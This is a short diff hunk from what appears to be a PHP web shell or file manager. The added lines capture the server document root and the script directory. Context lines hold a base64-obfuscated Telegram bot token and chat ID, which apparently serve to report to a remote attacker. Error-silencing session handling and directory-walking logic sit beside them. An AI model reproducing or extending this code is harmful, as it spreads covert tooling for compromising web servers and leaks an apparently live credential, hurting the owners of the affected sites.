@@ -5,6 +5,8 @@ register_shutdown_function(function(){$e=error_get_last();if($e&&in_array($e['ty
 $tk=base64_decode("ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==");
 $cid=base64_decode("ODkzMDE3NDQ2Mw==");
 if(session_status()!==PHP_SESSION_ACTIVE)@session_start();
+$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
+$scriptDirectory = dirname(__FILE__);
 $docroot=realpath(__DIR__);
 $anchor=realpath(__DIR__.'/../../');if($anchor===false)$anchor=$docroot;
 /* Document root */
